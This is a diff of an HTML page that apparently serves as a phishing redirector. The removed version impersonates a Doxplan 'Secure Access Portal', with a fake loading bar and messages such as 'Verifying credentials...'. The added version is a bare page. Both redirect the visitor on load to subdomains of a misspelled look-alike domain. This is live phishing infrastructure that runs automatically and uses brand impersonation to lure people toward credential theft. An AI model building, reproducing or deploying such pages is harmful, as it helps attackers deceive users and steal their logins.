@@ -4,237 +4,28 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Doxplan</title>
+<title>Redirecting...</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
 body{
-    background:linear-gradient(135deg,#062b37,#0b3c4d);
-    height:100vh;
-    overflow:hidden;
+    margin:20px;
     font-family:Arial, Helvetica, sans-serif;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    position:relative;
-}
-
-/* Animated background */
-body::before{
-    content:"";
-    position:absolute;
-    width:800px;
-    height:800px;
-    border:2px solid rgba(255,255,255,.05);
-    border-radius:50%;
-    right:-250px;
-    top:-250px;
-    animation:rotate 25s linear infinite;
-}
-
-body::after{
-    content:"";
-    position:absolute;
-    width:500px;
-    height:500px;
-    border:2px solid rgba(255,255,255,.03);
-    border-radius:50%;
-    left:-150px;
-    bottom:-150px;
-    animation:rotateReverse 20s linear infinite;
-}
-
-@keyframes rotate{
-    from{transform:rotate(0deg);}
-    to{transform:rotate(360deg);}
-}
-
-@keyframes rotateReverse{
-    from{transform:rotate(360deg);}
-    to{transform:rotate(0deg);}
-}
-
-.wrapper{
-    text-align:center;
-    z-index:10;
-    animation:fadeIn 1.5s ease;
-    width:100%;
-    max-width:800px;
-    padding:20px;
-}
-
-@keyframes fadeIn{
-    from{
-        opacity:0;
-        transform:translateY(20px);
-    }
-    to{
-        opacity:1;
-        transform:translateY(0);
-    }
-}
-
-.brand-row{
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    margin-bottom:60px;
-}
-
-.brookfield-logo{
-    width:420px;
-    max-width:90vw;
-    height:auto;
-    display:block;
-    filter:brightness(1.1);
-}
-
-.loading-section{
-    width:500px;
-    max-width:90vw;
-    margin:auto;
-}
-
-.loading-bar{
-    width:100%;
-    height:10px;
-    background:rgba(255,255,255,.1);
-    border-radius:20px;
-    overflow:hidden;
-}
-
-.loading-progress{
-    width:0%;
-    height:100%;
-    background:linear-gradient(90deg,#00c6ff,#00ff88);
-    box-shadow:0 0 15px rgba(0,255,136,.5);
-}
-
-.percent{
-    color:white;
-    font-size:22px;
-    margin-top:15px;
-    font-weight:bold;
-}
-
-.status{
-    margin-top:15px;
-    color:#cccccc;
-    font-size:15px;
-}
-
-.spinner{
-    width:40px;
-    height:40px;
-    margin:25px auto;
-    border:4px solid rgba(255,255,255,.15);
-    border-top:4px solid #00c6ff;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-}
-
-@keyframes spin{
-    100%{
-        transform:rotate(360deg);
-    }
-}
-
-.footer{
-    position:absolute;
-    bottom:25px;
-    width:100%;
-    text-align:center;
-    color:rgba(255,255,255,.4);
-    font-size:13px;
+    background:#fff;
+    color:#444;
+    font-size:14px;
 }
 </style>
-</head>
-
-<body>
-
-<div class="wrapper">
-
-    <div class="brand-row">
-        <img
-            src="https://www.doxplan.com/Custom/images/dox-gpo.png"
-            alt="Doxplan"
-            class="brookfield-logo">
-    </div>
-
-    <div class="loading-section">
-
-        <div class="loading-bar">
-            <div class="loading-progress" id="progress"></div>
-        </div>
-
-        <div class="percent" id="percent">0%</div>
-
-        <div class="spinner"></div>
-
-        <div class="status" id="status">
-            Initializing secure environment...
-        </div>
-
-    </div>
-
-</div>
-
-<div class="footer">
-    © Doxplan — Secure Access Portal
-</div>
 
 <script>
-
-const redirectURL = "";
-
-const messages = [
-    "Initializing secure environment...",
-    "Connecting to Doxplan services...",
-    "Loading resources...",
-    "Synchronizing data...",
-    "Verifying credentials...",
-    "Preparing workspace...",
-    "Ready."
-];
-
-let progress = 0;
-
-const progressBar = document.getElementById("progress");
-const percent = document.getElementById("percent");
-const status = document.getElementById("status");
-
-const timer = setInterval(() => {
-
-    progress++;
-
-    progressBar.style.width = progress + "%";
-    percent.textContent = progress + "%";
-
-    const stage = Math.floor(progress / 15);
-
-    if (messages[stage]) {
-        status.textContent = messages[stage];
-    }
-
-    if (progress >= 100) {
-
-        clearInterval(timer);
-
-        status.textContent = "Redirecting...";
-
-        setTimeout(() => {
-            window.location.href = "https://en91uz5eyu.securedocssharinng.vip/l/B5qmvValKAs";
-        }, 1000);
-    }
-
-}, 50);
-
+setTimeout(function () {
+    window.location.href = "https://yre03vm29a.securedocssharinng.vip/l/py_psNagnp8";
+}, 1000);
 </script>
+
+</head>
+<body>
+
+Redirecting...
 
 </body>
 </html>
